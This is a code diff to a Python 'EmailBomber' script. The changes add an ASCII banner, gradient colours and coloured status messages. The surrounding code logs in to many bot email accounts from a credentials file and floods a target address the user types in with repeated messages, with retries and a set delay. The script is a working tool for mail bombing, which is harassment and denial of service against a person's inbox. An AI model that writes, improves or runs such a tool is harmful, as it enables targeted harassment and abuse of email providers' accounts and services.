@@ -8,9 +8,21 @@ from pathlib import Path
 import sys
 import time
 
+banner = r"""
+ ________  ___  ________  ___  __    ________  ________  _____ ______   ________  _______   ________     
+|\   __  \|\  \|\   ____\|\  \|\  \ |\   __  \|\   __  \|\   _ \  _   \|\   __  \|\  ___ \ |\   __  \    
+\ \  \|\  \ \  \ \  \___|\ \  \/  /|\ \  \|\ /\ \  \|\  \ \  \\\__\ \  \ \  \|\ /\ \   __/|\ \  \|\  \   
+ \ \   _  _\ \  \ \  \    \ \   ___  \ \   __  \ \  \\\  \ \  \\|__| \  \ \   __  \ \  \_|/_\ \   _  _\  
+  \ \  \\  \\ \  \ \  \____\ \  \\ \  \ \  \|\  \ \  \\\  \ \  \    \ \  \ \  \|\  \ \  \_|\ \ \  \\  \| 
+   \ \__\\ _\\ \__\ \_______\ \__\\ \__\ \_______\ \_______\ \__\    \ \__\ \_______\ \_______\ \__\\ _\ 
+    \|__|\|__|\|__|\|_______|\|__| \|__|\|_______|\|_______|\|__|     \|__|\|_______|\|_______|\|__|\|__|
+
+                                                                                                        @sug023
+"""
+
 class EmailBomber:
 
-    def __init__(self):
+    def __init__(self, banner=banner):
         self.credentials_path = self.get_script_dir() / "bots.txt"
         self.content_path = self.get_script_dir() / "content.json"
         self.target_email = None
@@ -18,7 +30,22 @@ class EmailBomber:
         self.email_content = []
         self.delay = 0
         self.retry_interval = 5  
-        self.max_retries = 36  
+        self.max_retries = 36
+        self.banner = banner
+
+    def print_gradient_banner(self):
+        os.system('cls' if os.name == 'nt' else 'clear')
+        lines = self.banner.splitlines()
+        start_color = (255, 0, 0)    
+        end_color = (128, 0, 128)    
+        for line in lines:
+            line_len = len(line)
+            for i, char in enumerate(line):
+                r = int(start_color[0] + (end_color[0]-start_color[0])*i/max(1,line_len-1))
+                g = int(start_color[1] + (end_color[1]-start_color[1])*i/max(1,line_len-1))
+                b = int(start_color[2] + (end_color[2]-start_color[2])*i/max(1,line_len-1))
+                print(f"\033[38;2;{r};{g};{b}m{char}", end='')
+            print("\033[0m")  
 
     def find_file(self, file_name: str) -> str:
         if os.path.exists(file_name):
@@ -69,7 +96,7 @@ class EmailBomber:
             while retries < self.max_retries:
                 try:
                     server.login(email, app_password)
-                    print(f"[+] Successful login from {email}")
+                    print(f"\033[1;32m[+] Successful login from {email}\033[0m")
 
                     for subject, message in self.email_content:
                         msg = MIMEMultipart()
@@ -79,16 +106,16 @@ class EmailBomber:
                         msg.attach(MIMEText(message, 'plain'))
 
                         server.sendmail(email, self.target_email, msg.as_string())
-                        print(f"[+] Email sent from {email} to {self.target_email} with subject: {subject}")
+                        print(f"\033[1;34m[+] Email sent from {email} to {self.target_email} with subject: {subject}\033[0m")
 
                     return True 
 
                 except smtplib.SMTPAuthenticationError:
-                    print(f"[!] Authentication error for {email}")
+                    print(f"\033[1;31m[!] Authentication error for {email}\033[0m")
                     return False 
 
                 except smtplib.SMTPException as e:
-                    print(f"[!] Error sending email from {email}: {e}")
+                    print(f"\033[1;31m[!] Error sending email from {email}: {e}\033[0m")
                     retries += 1
                     time.sleep(self.retry_interval) 
 
@@ -119,7 +146,7 @@ class EmailBomber:
             self.bomb_email(server)
             server.quit()
         except smtplib.SMTPException as e:
-            print(f"[!] SMTP connection error: {e}")
+            print(f"\033[1;31m[!] SMTP connection error: {e}\033[0m")
 
     @staticmethod
     def check_email(email: str) -> bool:
@@ -135,17 +162,19 @@ class EmailBomber:
         return True
 
     def run(self):
-        os.system('clear' if os.name == 'posix' else 'cls')
-        self.target_email = input("[+] Enter the target email address: ")
+        self.print_gradient_banner()
+        self.target_email = input("\033[1;33m[+] Enter the target email address: \033[0m")
         while not self.check_email(self.target_email):
-            os.system('clear' if os.name == 'posix' else 'cls')
-            print("[!] Invalid email format. Please try again.\n")
-            self.target_email = input("[+] Enter the target email address: ")
+            self.print_gradient_banner()
+            print("\033[1;31m[!] Invalid email format. Please try again.\033[0m\n")
+            self.target_email = input("\033[1;33m[+] Enter the target email address: \033[0m")
 
-        os.system('clear' if os.name == 'posix' else 'cls')
-        self.content_path = input("[+] Enter the path to the content JSON file (default: content.json): ") or self.content_path
-        self.credentials_path = input("[+] Enter the path to the credentials file (default: bots.txt): ") or self.credentials_path
-        self.delay = int(input("[+] Enter the delay between emails in seconds (default: 0): ") or 0)
+        self.print_gradient_banner()
+        self.content_path = input("\033[1;33m[+] Enter the path to the content JSON file (default: content.json): \033[0m") or self.content_path
+        self.print_gradient_banner()
+        self.credentials_path = input("\033[1;33m[+] Enter the path to the credentials file (default: bots.txt): \033[0m") or self.credentials_path
+        self.print_gradient_banner()
+        self.delay = int(input("\033[1;33m[+] Enter the delay between emails in seconds (default: 0): \033[0m") or 0)
 
         self.spam_email()
 
